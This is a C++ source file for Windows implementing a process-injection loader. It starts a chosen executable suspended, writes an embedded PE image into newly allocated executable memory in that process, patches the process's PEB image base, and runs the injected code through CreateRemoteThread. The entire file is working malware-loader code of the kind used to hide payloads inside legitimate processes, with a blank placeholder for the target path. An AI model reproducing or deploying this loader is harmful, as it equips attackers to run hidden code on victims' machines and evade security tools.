#include <Windows.h>
#include <strsafe.h>
#include "main.h"

#pragma comment(linker,"/ENTRY:mainCRTStartup")

int main() {

	//Pointers to Dos and Nt headers structs of data
	PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)data;
	PIMAGE_NT_HEADERS NtHeader = (PIMAGE_NT_HEADERS)(data + DosHeader->e_lfanew);

	//Initialising parameters for CreateThread
	LPWSTR AppPath = (LPWSTR)malloc(1024 * sizeof(char));
	PPROCESS_INFORMATION ProcessInfo = (PPROCESS_INFORMATION)malloc(sizeof(PROCESS_INFORMATION));
	STARTUPINFO StartInfo = { sizeof(StartInfo) };

	ULONG BytesReturned;
	PROCESS_BASIC_INFORMATION ProcBasicInfo;
	void* NewImageBase;
	DWORD PEBImageBase;

	StringCchCopy(AppPath, 1024, L" "); // Executable To Inject Into (PATH)
	HMODULE ntDll = LoadLibraryA("ntdll.dll");
	NTQUERYINFOPROC NtQueryInfoProcess = (NTQUERYINFOPROC)GetProcAddress(ntDll, "NtQueryInformationProcess");

	if (NtHeader->Signature != IMAGE_NT_SIGNATURE) {
		return 1;
	}

	CreateProcess(AppPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &StartInfo, ProcessInfo);

	NtQueryInfoProcess(
		ProcessInfo->hProcess,
		ProcessBasicInformation,
		&ProcBasicInfo,
		sizeof(PROCESS_BASIC_INFORMATION),
		&BytesReturned);

	NewImageBase = VirtualAllocEx(ProcessInfo->hProcess,
		NULL,
		NtHeader->OptionalHeader.SizeOfImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	//Writing all the headers
	WriteProcessMemory(ProcessInfo->hProcess, NewImageBase, data, NtHeader->OptionalHeader.SizeOfHeaders, 0);

	//Writing Sections
	PIMAGE_SECTION_HEADER SectionHeader = PIMAGE_SECTION_HEADER(DWORD(data) + DosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));

	for (int num = 0; num < NtHeader->FileHeader.NumberOfSections; num++)
	{
		WriteProcessMemory(ProcessInfo->hProcess,
			(LPVOID)(DWORD(NewImageBase) + SectionHeader->VirtualAddress),
			LPVOID(DWORD(data) + SectionHeader->PointerToRawData),
			SectionHeader->SizeOfRawData,
			0);
		SectionHeader++;
	}

	//Address of 6th member of PEB aka BaseAddressofImage or refered in winternl.h as Reserved3[1]
	PEBImageBase = (DWORD)ProcBasicInfo.PebBaseAddress + 0x08;
	WriteProcessMemory(ProcessInfo->hProcess, (LPVOID)PEBImageBase, LPVOID(&NewImageBase), 4, 0);

	HANDLE NewThread = CreateRemoteThread(ProcessInfo->hProcess,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)((DWORD)(NewImageBase)+NtHeader->OptionalHeader.AddressOfEntryPoint),
		NULL,
		CREATE_SUSPENDED,
		NULL);

	ResumeThread(NewThread);
	SuspendThread(ProcessInfo->hThread);

	FreeLibrary(ntDll);
	return 0;
}